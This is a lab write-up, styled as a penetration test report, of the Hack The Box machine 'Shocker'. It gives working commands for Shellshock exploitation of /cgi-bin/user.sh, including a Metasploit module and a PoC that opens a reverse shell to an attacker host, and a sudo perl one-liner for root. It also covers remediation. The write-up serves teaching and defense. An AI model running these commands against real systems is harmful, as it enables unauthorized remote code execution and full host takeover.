# Penetration Test Report — Shocker

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-Shellshock%20%2F%20sudo-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` identified an Apache `mod_cgi` endpoint vulnerable to **Shellshock** (CVE-2014-6271), providing unauthenticated remote code execution as a low-privileged user. A NOPASSWD sudo rule for `/usr/bin/perl` was then abused to obtain a root shell — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Apache mod_cgi vulnerable to Shellshock (CVE-2014-6271) | Critical |
| 2 | NOPASSWD sudo rule for `/usr/bin/perl` | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
nmap -sC -sV target.htb
```

Apache (80) and OpenSSH on a non-standard port. Directory fuzzing produced limited results; given the attack surface, `/cgi-bin/` was fuzzed for script extensions (`cgi`, `sh`, `pl`, `py`), revealing **`/cgi-bin/user.sh`** — a prime Shellshock target.

### 2. Exploitation — Shellshock

Metasploit:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.htb
set TARGETURI /cgi-bin/user.sh
run
```

Manual (PoC [EDB-34900](https://www.exploit-db.com/exploits/34900/), unmodified):

```bash
./shellshock.py payload=reverse rhost=target.htb lhost=<attacker-ip> lport=<port> pages=/cgi-bin/user.sh
```

User-level shell obtained; flag at `/home/shelly/user.txt`.

### 3. Privilege Escalation — sudo perl

LinEnum flagged a NOPASSWD rule for Perl:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/perl

sudo /usr/bin/perl -e 'exec "/bin/sh"'
```

Root shell; flag at `/root/root.txt`.

## Remediation

- Patch Bash (Shellshock); remove unused scripts from `cgi-bin`; disable mod_cgi if not required.
- Remove NOPASSWD sudo rules for interpreters (perl/python/etc.) — they are direct root shells.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application (Shellshock) |
| Privilege Escalation | T1548.003 — Sudo abuse |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
